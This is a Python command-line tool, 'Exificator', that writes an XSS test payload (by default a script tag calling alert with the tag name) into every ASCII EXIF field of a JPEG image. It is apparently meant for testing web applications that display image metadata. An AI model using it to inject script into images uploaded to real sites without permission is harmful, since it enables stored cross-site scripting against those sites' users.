import argparse
import exif
import os

# Collected from exif module source code (exif/_constants.py)
ASCII_TAGS = [ "artist", "body_serial_number", "copyright", "datetime", "datetime_digitized", "datetime_original", "gps_datestamp", "gps_dest_bearing_ref", "gps_dest_distance_ref", "gps_dest_latitude_ref", "gps_dest_longitude_ref", "gps_img_direction_ref", "gps_latitude_ref", "gps_longitude_ref", "gps_map_datum", "gps_measure_mode", "gps_satellites", "gps_speed_ref", "gps_status", "gps_track_ref", "image_description", "image_unique_id", "lens_make", "lens_model", "lens_serial_number", "make", "model", "software", "spectral_sensitivity", "subsec_time", "subsec_time_original", "subsec_time_digitized", "user_comment" ]


def process_image(input_filename, output_filename, tags, payload):
    with open(input_filename, 'rb') as image_file:
        try:
            image = exif.Image(image_file)
        except:
            print('Failed to read EXIF data from image. Is it a JPEG file?')
            exit(1)

        for tag in tags:
            if tag not in ASCII_TAGS:
                print('Tag ' + tag + ' is not available tag. Skipping...')
                continue

            formatted_payload = payload.format(tag)
            try:
                image[tag] = formatted_payload
            except:
                print('Failed to set tag: ' + tag)
        
        with open(output_filename, 'wb') as output_file:            
            output_file.write(image.get_file())

        

def main():
    parser = argparse.ArgumentParser(description='Exificator')
    parser.add_argument('filename', help='Input filename. Only JPEG is supported', default=None, nargs='?')
    parser.add_argument('-o', '--output', help='Output filename. By default, filename-output.ext')
    parser.add_argument('-f', '--force', help='Overwrite output file if exists without confirmation', action='store_true', default=False)
    parser.add_argument('-p', '--payload', help='String to set in EXIF attributes. {} is replaced with the exif tag. Default: "<script>alert(\'{}\')</script> ', default='"><script>alert(\'{}\')</script>')
    parser.add_argument('--tags', help='List of tags to set, comma separated. Default: all tags', default=",".join(ASCII_TAGS))
    parser.add_argument('--list-tags', help='List all available tags', action='store_true', default=False)
    args = vars(parser.parse_args())

    if not args['filename'] and not args['list_tags']:
        parser.print_help()
        exit()

    args['tags'] = args['tags'].split(',')

    if args['list_tags']:
        print('List of available EXIF tags:')
        for tag in ASCII_TAGS:
            print(tag)
        exit(0)

    input_filename = args['filename']
    if not os.path.isfile(input_filename):
        print('Input file does not exist.')
        exit(1)

    # if output filename is not specified, use input filename. Keep the name, add "-output" suffix and extension
    if args['output'] is None:
        if "." in input_filename:
            output_filename = (input_filename.split('.')[0] + '-output.' + input_filename.split('.')[1])
        else:
            output_filename = input_filename + '-output'
    else:
        output_filename = args['output']
    
    print('Input filename: ' + input_filename)
    print('Output filename: ' + output_filename)

    # check if output_filename file exists
    if not args['force'] and os.path.isfile(output_filename):
        print('Output file already exists. Overwrite? [y/N]: ', end='', flush=True)
        overwrite = input()
        if overwrite.lower() != 'y':
            print('Exiting...')
            exit(1)

    process_image(input_filename, output_filename, args['tags'], args['payload'])
    print('Done.')


if __name__ == '__main__':
    main()